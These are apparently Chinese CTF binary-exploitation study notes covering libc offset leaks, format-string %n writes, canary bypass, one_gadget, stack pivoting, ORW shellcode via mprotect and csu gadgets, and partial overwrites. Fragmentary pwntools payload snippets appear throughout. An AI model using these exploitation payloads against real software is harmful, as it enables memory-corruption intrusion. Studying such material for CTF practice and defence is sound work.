+<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4_i386（32位程序）的</strong></p>
+<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4&#x2F;3.5_amd64（64位程序）的</strong></p>
+<p>在pwntools中，p.recvuntil(“\n”)指的是接收数据，直到遇到换行符”\n”为止。这个指令用于从程序的输出中提取特定的数据。</p>
+<p>libcaddr&#x3D;u64(p.recv(6).ljust(8,”\x00”))指的是从程序的输出中接收6个字节的数据，然后用空字节”\x00”填充到8个字节，并将其解释为一个64位的无符号整数（unsigned long long）。</p>
+<p>而libcaddr&#x3D;u32(io.recv(4))指的是从程序的输出中接收4个字节的数据，并将其解释为一个32位的无符号整数（unsigned int）。</p>
+<h3 id="如何获取函数在libc中的偏移量呢？"><a href="#如何获取函数在libc中的偏移量呢？" class="headerlink" title="如何获取函数在libc中的偏移量呢？"></a>如何获取函数在libc中的偏移量呢？</h3><p>这里可能有两种情况，一种是libc已知，一种是libc未知。</p>
+<p><strong>libc已知</strong></p>
+<p>libc已知的情况，可以通过反编译libc获取地址。如下所示，利用radare分析libc文件，可以获取libc中write的偏移地址是<code>0x000d43c0</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000187c0</span>]&gt; afl | grep write</span><br><span class="line"><span class="number">0x00063880</span>   <span class="number">22</span> <span class="number">406</span>  -&gt; <span class="number">395</span>  sym._IO_wdo_write</span><br><span class="line"><span class="number">0x000d43c0</span>    <span class="number">5</span> <span class="number">101</span>          sym.__write</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以通过pwntools的ELF类，加载libc文件来获取目标函数的偏移地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc= ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_write_offset = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在64位的系统中在执行部分函数时其汇编代码中有,当程序在执行时发现停在这条指令而无法继续执行下去时说明程序在该函数的栈存在栈没有对齐的情况，解决的方法便是在payload的该函数的执行之前加上一个ret的命令。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0这条指令会检查栈是否对齐</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再说b’a’*56的作用，他的作用就是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然执行400616处的函数，我们不希望它执行到此，因为会再次pop寄存器更换我们布置好的内容，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域,可以被填充)，用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p>
+<p>在C语言中对于一段字符串的存放与取用</p>
+<p>存放：在地址空间中将字符串转化位用x00截断的一串连续的字节序列（\ad\ds\ew\vd\x00）</p>
+<p>取用：为了节省空间在取用这一段数据时不会直接将整个数据直接传入到函数中，只会把那个数据存放的地址作为指针，把指针作为参数传入到函数中，在调用函数时函数再到指针所指的地址中将那段数据，读出来使用。</p>
+<p>在使用printf打印字符时，当传进的数用的是</p>
+<p>%p时直接打印的栈上存放的数据，无论是真实的数据还是地址数据都直接打印出来，不做任何的操作</p>
+<p>%s时则会先把栈中的数据作为地址将其解析，然后将其作为地址对应的数据打印出来</p>
+<p>%n的作用是将栈中的数据作为地址将其解析，然后向那个数据的地址写入数据，而写入的数据是<strong>格式化字符串前方已经打印成功的字符的个数</strong>（如在%n执行之前成功打印出AAAAA的数据，则会在%n所在的数据代表的地址执行的地方改写成5），</p>
+<p>%11$n是一个格式化字符串中的特殊标记，它表示将当前打印字符的数量存储在第11个参数所指向的位置中。这个特性通常被用于进行格式化字符串漏洞攻击，要写第几个参数的位置就在%n中加上几$</p>
+<p>%c表示输出一个字符，如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c,&quot;</span>c)</span><br></pre></td></tr></table></figure>
+
+<p>则会打印a这个字符，如果在后面有%n则算作1，如果%n要多个则可以将要的字节长度加在%和n的中间，如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%20n&quot;</span>,c)</span><br></pre></td></tr></table></figure>
+
+<p>执行这个指令会打印的是长度为20的数据，且最后是a，在之前用空格补充不足20字节的地方，而如果后面有%n这会直接输入的数为20</p>
+<p>在用printf函数时,在打印数据的符号中间加上（’数字$‘）意为打印第几个参数的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c)</span><br></pre></td></tr></table></figure>
+
+<p>如这个，意为直接打印第三个参数，c的值</p>
+<p>对于在程序输出中的数据中有我们需要的地址，但不是直接输出，可以用如下接收、</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cancry =<span class="type">int</span>(io.recv(<span class="number">16</span>/<span class="number">8</span>),<span class="number">16</span>)<span class="comment">//如果是64位程序为16,32位为8</span></span><br><span class="line"><span class="comment">//16和8的区别在于程序最终需要的数据是几位的（16进制），如要的是0x0x5619d9400ccd，这为io.recv（12）    </span></span><br><span class="line">    libc_start_main = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=u64(io.recv(<span class="number">12</span>))</span><br><span class="line">    libc_start_main = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=<span class="type">int</span>(io.recvline().strip().split(b<span class="number">&#x27;</span> <span class="string">&#x27;)[-1])</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>所以我们需要把system的地址分成高八位和低八位 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">high_sys = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">low_sys = system_addr &amp; <span class="number">0xffff</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的右移16位就是向右移动4个字节，获得到high_sys的高4位地址</p>
+<p>这个错误是由于在将整数转换为字节串时，需要使用<code>encode()</code>函数。你可以使用以下代码来解决这个问题：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack-<span class="number">0xc</span>) &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%6&amp;hhn&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在有些题中会遇到如下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br></pre></td></tr></table></figure>
+
+<p>解释一下，这里将当前的时间作为一个种子复制给v0（*v0 &#x3D; time(0LL)*），将v0这个种子植入到srand函数中，之后rand函数会根据srand中的数值生成一个随机数，由于之前的种子是有当时时间决定的，故理论上每次运行中的rand中的值由于v0的不同而生成的随机数也不同。如果不将srand中的值用v0作为一个时间变量的话rand中生成的随机数是固定的一个数。</p>
+<p>如果在程序中不能直接暴露那个随机数可通过以下代码直接将那个数在脚本中同样生成，（同时运行时间相同，srand生成相同的随机数）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>) #调用标准库</span><br><span class="line">srand = libc.srand(libc.time(None)) <span class="meta">#libc.time(None) 获取当前时间，然后将这个时间值传递给 libc.srand 函数来设置随机数生成器的种子</span></span><br><span class="line">saved_cookie = libc.rand() #生成随机数</span><br><span class="line">io.sendline(str(saved_cookie))#数字传入程序中需要str    </span><br></pre></td></tr></table></figure>
+
+<p>libc.so.6是调用本地的库，在打远程时需根据远程的环境改变，</p>
+<p>这一段代码要放在接近程序中生成随机数的地方，最好脚本的开始。</p>
+<p>fgets函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> bufsize, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中的int bufsize指的是能输入的字节的大小，将int bufsize看作n，fgets函数只能读取 n-1 个字符（包括换行符）。如果有一行超过 n-1 个字符，那么 fgets 函数将返回一个不完整的行（只读取该行的前 n-1 个字符）</p>
+<p>也就是说，每次调用时，fgets 函数都会把缓冲区的最后一个字符设为 null(‘\0’)，这意味着最后一个字符不能用来存放需要的数据。所以如果某一行含有 size 个字符（包括换行符），要想把这行读入缓冲区，要把参数 n 设为 size+1，即多留一个位置存储 null(‘\0’)。</p>
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>在payload的构造中如果要使用到base64编码一个数据，在传入到中可以用以下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64//导入库，在脚本的一开始处就要</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">22</span>//在使用base64这个库时因为后面的代码有地方改变，不能加b</span><br><span class="line">payload64= base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">//将payload中的值转化为base64编码的赋值给paylaod64</span><br><span class="line">//此时直接输出payload64中的值会自动加入b，可直接使用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">32</span>+p32(printf)</span><br><span class="line">payload64= base64.b64encode(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在使用栈覆盖将canary暴露出来是，先在调试阶段找到canary的地方，确定输入多少才能到canary的地方，如输入地方在0x11处，在调试中的canary指到的地方位0x22，距离为17个数，这可以构建的payload为b‘A’*17+b’B’，B的作用在与覆盖00，根据canary的值确定收的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;A&quot;</span>*(<span class="number">17</span>)+<span class="string">&#x27;B&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">canary=u32(b<span class="string">&quot;\x00&quot;</span>+io.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>沙箱查询，用一下命令查找程序是否启动了沙箱</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t0158ada8c0a923003f.png" alt="img"></p>
+<p>如果出现了以上情况则说明该程序中的禁用了 <code>execve</code>, 由于<code>system</code>函数实际上也是借由 <code>execve</code>实现的, 因此通过 <code>get shell</code>的方法来解决本题比较困难 ，要用到ORW方法</p>
+<p>如果程序没用使用沙箱则会出现程序正常的执行效果。</p>
+<p>对于直接可以获得getshell的题，并且题目中没有后门函数，直接获得getshll的方法有3种</p>
+<p>1.用got表中的system和&#x2F;bin&#x2F;sh的地址直接获得getshell</p>
+<p>2.使用one_gadget直接获得shell</p>
+<p>3.修改寄存器的值并执行命令</p>
+<p>对于以上3种办法，第一种不多说，直接整就行，重点在第2，3种</p>
+<p>二，ong_gadget其实是在库中的一段指令，而这段指令只要执行就可以直接获得shell，但这种指令对寄存器有一定的要求，所以不并不是都可以，并且有的版本过高使得不能一次直接执行成功，我们一般也不会只得到一个，最好一个一个试看看能获得shell，</p>
+<p>对于程序中的one_gadget的寻找可以通过一个工具直接找，需要执行以下的名令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>(/usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span>)</span><br></pre></td></tr></table></figure>
+
+<p>后面接入的是动态链接库，对于32位和64位是不同的库，可以直接在gdb在找，如要打远程则用远程的库，</p>
+<p>![屏幕截图 2024-01-07 150423](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2024-01-07 150423.png)</p>
+<p>一般执行后的情况如下</p>
+<p>![屏幕截图 2024-01-07 150608](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2024-01-07 150608.png)</p>
+<p>要用到的是execve前面的数，这个数字代表这的是在程序中的one_gadget相对于程序基值的偏移量，在使用的过程中用这个数加上程序的基值，便是one_getgad的地址，将程序在执行过程中挟持到这个地方便可以执行one_getgad.但是很多时候并不能成功要每一个都试一下</p>
+<p>三，对于第3种修盖寄存器的指令，就是如下的办法，但很多时候程序中有的指令时不够用的，以此便要提到使用库中的方法</p>
+<p>![屏幕截图 2024-01-07 155233](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2024-01-07 155233.png)</p>
+<p>在所有的动态链接库中都有很多的指令，不过动态链接库中的地址都是相对偏移量，要加上程序的基值才是真实地址，并且有的并不能把直接用，要多试</p>
+<p>![屏幕截图 2024-01-07 154649](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2024-01-07 154649.png)</p>
+<p>如图，可以使用ROP的方法在链接库中寻找需要的偏移量，相同的对于在函数中要用的syscall和0x80指令都可以在动态链接库中找到，然后直接用就行，</p>
+<p>对于64位的程序补充一种指令的使用，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi--&gt;binsh</span><br><span class="line">rsi--&gt;<span class="number">0</span></span><br><span class="line">r15--&gt;<span class="number">0</span></span><br><span class="line">rdx--&gt;<span class="number">0</span></span><br><span class="line">system    </span><br></pre></td></tr></table></figure>
+
+<p>对于64位的程序如果直接用system(&#x2F;bin&#x2F;sh)可能会出现问题，便可以用以上的方法获得shell</p>
+<p>栈迁移</p>
+<p>对与在栈溢出的情况中如果，输入的地方有限制使得能溢出的大小比较小，不够直接直接执行getgad便需要将栈进行迁移，对于迁移的地方有两个，一种是将程序在此迁移到栈执行的地方将程序在栈上在执行一次，将我们的getgad输入到栈上，执行之后获得shell，但这种的限制比较高，最好不要将程序只要，最好将程序通过溢出使其栈迁移到bss段中的空白处，然后向那段程序中写入getgad并执行</p>
+<p>无论是32位还是64位的程序，基础的栈迁移都是一样的，先将要溢出的0-地方的写满，刚好写到变量的最大值（看程序中的变量到ebp的距离），先全部覆盖完之后，在写入要将栈迁移的地址，最后写leave的地址（在程序中找，一般可以直接找到）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到ebp的量)+p32(新地址)/p64()+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>
+
+<p>这样之后栈的ebp便会改变为新的地址，然后程序便会执行新地址4位（32位的程序）&#x2F;8位数（64位的程序）后面的地址中的指令，而新地址的前面4或8位数将成为程序执行这一部分时的ebp中的值，因此，<strong>在bss段中栈的新迁移地址的前4&#x2F;8位数要么是垃圾数据，要么是再下次栈迁移的新地址。</strong></p>
+<p>如果在程序中有canary保护时，栈迁移则需要先将canary绕过在将数据覆盖到ebp的位置，然后再迁移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*程序崩溃前最大值+p32/<span class="number">64</span>(canary)<span class="comment">//如果有问题将p32/p64去除，直接使用canary</span></span><br><span class="line">payload=payload.ljust(到ebp的量,b<span class="number">&#x27;</span>\<span class="number">00&#x27;</span>)</span><br><span class="line">payload+=p32/<span class="number">64</span>(新地址)+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在很多可以输入的地方，特别要注意是否对输入的数据的长度有没有检查，对于有检查的要重点注意输入的数据是否超出可以输入的长度，特别在栈迁移中，对于是否要加上<strong>line</strong>，既在输入的数据的末位加上<strong>\n</strong>(很多时候这个换行符会被当成一个字节)要多加小心，有时会因为这个字节使输入时出现问题</p>
+<p>同时<strong>line</strong>的使用也是必不可少的，有时候不加这个最后的换行符，会使数据传不过去，要随时注意</p>
+<p><strong>在有的栈迁移中垃圾数据的长度不一定是到rdp长度加上8&#x2F;4，有可能只是到rbp的长度不用加上后面的数据便可以直接进行栈迁移</strong></p>
+<p>再用动态链接库调用函数的偏移地址的方法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span>=elf.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line">sys=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = next(elf.search(bytes(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>本地的库可以在gdb调式中找到，远程的库直接链接就行</p>
+<p>在一些程序中特别是静态的程序，他会将如main函数等主要的函数换一个看不出来特别的函数名，此时若要找到其主要函数的位置则可以通过在汇编中的start函数中的位置找到</p>
+<p><img src="https://xuanxuanblingbling.github.io/assets/pic/317/start.png" alt="img"></p>
+<p><strong>ORW</strong></p>
+<p>关于有沙箱的题的禁用了system等直接获得shell的题目，通过mprotect函数和shellcode直接将flag打印在屏幕上，</p>
+<p>在遇到这类题如果有canary保护，必须要通过之前的方法将canary绕过，这里将直接写payload的过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rdi_ret) + p64(bss_addr + <span class="number">0x500</span>) + p64(gets)</span><br><span class="line">    #构造mprotect，更改内存保护属性</span><br><span class="line">payload+=p64(pop_rdx_pop_r12_ret)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)#设置保护属性</span><br><span class="line">    <span class="comment">//这里只用将rdx改为7便可以，如果没有单独的rdx在加上其他寄存器</span></span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret) + p64(<span class="number">0x1500</span>) + p64(<span class="number">0</span>)#设置大小</span><br><span class="line">payload += p64(pop_rdi_ret)     + p64((bss_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)#设置起始地址</span><br><span class="line">payload += p64(mprotect)#调用mprotect</span><br><span class="line">#修改内存保护属性后，令RIP指向下方构造的shellcode</span><br><span class="line">payload += p64(bss_addr + <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于上文中的pop ret指令如果能在程序中直接找的则最好，如果找不到则通过libc库中的指令运行，对于bss_addr + 0x500只要是bss段中的空地方都可以，mprotect的地址也需要在libc库中寻找，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc</span><br></pre></td></tr></table></figure>
+
+<p>将这段payload注入到程序中，之后便可以直接注入shellcode，关于shellcode可以直接使用库中能直接使用的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br><span class="line">payload  = shellcraft.open(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">#将远程flag文件内容写入缓冲区，open成功时返回值为<span class="number">3</span></span><br><span class="line"><span class="meta">#                          fd  address          size</span></span><br><span class="line">payload += shellcraft.read( <span class="number">3</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="keyword">asm</span>(payload))<span class="comment">//初始化后直接注入程序中</span></span><br></pre></td></tr></table></figure>
+
+<p>在shellcode的构造中fd的值为固定值</p>
+<p>address为程序中的空地址</p>
+<p>size为读取的数据长度</p>
+<p>这里讲关于ORW的另外一种使用payload构建指令集，然后调用三个不同的函数open，read，write（在有的题中的没有这个函数对与其他只要是能将东西打印在屏幕上的就行，如puts函数），</p>
+<p><em>1，调用open函数打开flag文件</em></p>
+<p>在程序的任意一个可读可写的区域如，bss段注入b’.&#x2F;flag\x00\x00’(满足8字节方便栈对其)</p>
+<p>将存放b’.&#x2F;flag\x00\x00’的地址注入到寄存器rdi中，（作为open函数打开的文件名）</p>
+<p>再将rsi和rbp中的值分别改为0和1，有时可能还需要将rdx中的值改为0</p>
+<ul>
+<li><code>rdi</code>：要打开的文件名的地址（”flag”的地址）</li>
+<li><code>rsi</code>：打开文件的模式标志（通常是<code>O_RDONLY</code>，即0）</li>
+<li><code>rdx</code>：额外的标志或权限（通常可以设置为0）</li>
+</ul>
+<p>在完成上面的一切后可以执行read函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;.</span>/flag\x00\x00<span class="number">&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)<span class="comment">//为./flag\x00\x00的存放地址</span></span><br><span class="line">payload+=p64(pop_rsi_pop_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">//在很多程序中不能找到之改变rsi的命令</span></span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(open_plt)</span><br></pre></td></tr></table></figure>
+
+<p>在执行完上面的程序后如果能成功打开文件，对于程序来说回通过rax寄存器返回一个值，对于这个值如果为非负数（一般为4），这表示成功打开这个文件，如果是负数如0xffff则没有打开成功，这个数是文件描述符 fd，将在后边调用read函数作为其中一个参数传入</p>
+<p><em>2，调用read将flag文件中内容读到程序中</em></p>
+<p>在调用read函数之前要将这三个寄存器改为相应的值</p>
+<ol>
+<li><code>rdi</code>：设置为文件描述符，即指向已经打开的文件的文件描述符。便是在调用open函数最后通过rax寄存器返回的值（一般为4）</li>
+<li><code>rsi</code>：设置为读取数据的缓冲区的地址。找一个可读可写的空地址bss段</li>
+<li><code>rdx</code>：设置为要读取的字节数。</li>
+<li>rbp：设置为1</li>
+</ol>
+<p>但是一般在程序中基本不能找到刚好改变这三的寄存器的命令</p>
+<p>特别是在动态链接中最多能找到的是改变rdi和rsi的命令，在这里将之前的一种方法再次讲一遍利用__libc_csu_init函数中的两段命令，将一些没有直接修改寄存器的值改变，</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240312163842964.png" alt="image-20240312163842964"></p>
+<p>一般在这个函数的最后这里都会有这两段命令，1，从0x400A3A到0x400A44的修改5个寄存器的值命令。2，从0x400A20到0x400A29的将r13,r14,r15d分别复制到rdx,rsi,edi(这里edi是rdi寄存器的后8位，一般来说对于rdi寄存器来说不会用到前8位，这样一般就可以了)，然后跳转到r12+rbx*8的地址。通过以上两段命令变刚好可将我们需要的三个寄存器的值改变，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)<span class="comment">//为了后面跳转不被影响</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(read_got)<span class="comment">//修改rbp的值，r12为之后要跳转的函数，必须使用got表的地址不能用plt的</span></span><br><span class="line">paylaod+=p64(<span class="number">0</span>x要读取的长度)+p64(buf空的可写可读之地)+p64(<span class="number">4</span>rax的返回值)</span><br><span class="line">payload+p64(csu_init)+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x38</span><span class="comment">//为了将使用这段指令所空出来的值补完便于执行后面需要的命令</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>如此在将这几个寄存器的值修改后便会执行got表的地址运行read函数将文件中的内容读到程序中的设定地</p>
+<p><em>3，调用puts函数将内容打印出</em></p>
+<p>将之前read函数读取的内容存放之地址放在rdi寄存器中执行plt表的puts函数地址就行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)+p64(puts_plt)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>至此便是通过orw的两方法将flag文件中的内容答应在屏幕上</p>
+<p>栈溢出的本意便是通过栈溢出将程序的执行劫持，通过栈溢出将本该执行的栈上的程序通过栈溢出覆盖成自己要想执行命令，如果有的栈所限制的数据太少以至于，连栈迁移的长度都不够，便可以考虑通过栈溢出后将后面要执行的，命令的地址的后面改成其他有用的函数地址，特别是在有pie保护的题中所有的程序只有最后4为数值不同，便可以再栈溢出后加上要挑战的函数的地址的最后的不同的几位，在栈溢出后便会直接跳转到需要执行的函数，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x28</span>+b<span class="number">&#x27;</span>\x69<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>对于整数溢出来说，有一种向下溢出，在程序中如果有整数溢出的存在，但一个数被减成负数时在程序中并不会显示成负值反而会成为一个在允许范围内最大的数，0xffff，同理在一个数被加时，当加的超过范围反而会成为特别小的，0x0001，在做这类题时一定要把握不对那个数进行检查就加或减的地方，在这次加和减中将整数溢出成为需要的那个数</p>
+<p><strong>纯手搓shellcode</strong></p>
+<p>shellcode的本质就是通过syscall的执行调用不同的函数从而实现目的</p>
+<p>对于不同的函数其系统的调用号不同，不同的系统调用号也能调用不同的函数，这个函数的系统调用号储存在rax寄存器中如，要通过syscall调用read，则在执行syscall这个命令之前要满足</p>
+<p><strong>RAX &#x3D; 0<br>RDI &#x3D; 0<br>RSI &#x3D; 要写入的地址<br>RDX &#x3D; 很大的数</strong></p>
+<p>相当于执行了read(RDI,RSI,RDX)，你就可以往RSI这个地方写很多数据，对于不同的函数的系统调用在下面这个中可以查到<a target="_blank" rel="noopener" href="https://blog.csdn.net/SUKI547/article/details/103315487">Linux系统调用表（64位）_系统调用号表-CSDN博客</a></p>
+<p>再知道相应的函数的系统调用号以后便可以开始写汇编以满足相应的函数调用，如</p>
